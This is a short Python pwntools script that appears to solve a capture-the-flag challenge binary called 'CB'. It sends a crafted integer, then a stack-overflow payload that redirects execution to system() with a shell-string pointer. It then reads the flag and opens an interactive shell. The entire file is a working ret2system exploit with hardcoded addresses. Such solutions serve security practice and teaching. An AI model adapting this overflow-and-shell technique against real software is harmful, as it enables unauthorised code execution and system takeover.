from pwn import *

context.log_level='debug'
libc = ELF('/lib32/libc.so.6')
s = process('./CB')
s.recv()
s.sendline(str(0x10000010))
system=0x8048430
sh = 0x804a060
s.sendline('A'*0x18+p32(system)+p32(sh)*2)
s.sendline('-1')

s.sendline("echo 1;cat flag")
s.recvuntil("1\n")
print "flag: "+s.recv(1024)
s.interactive()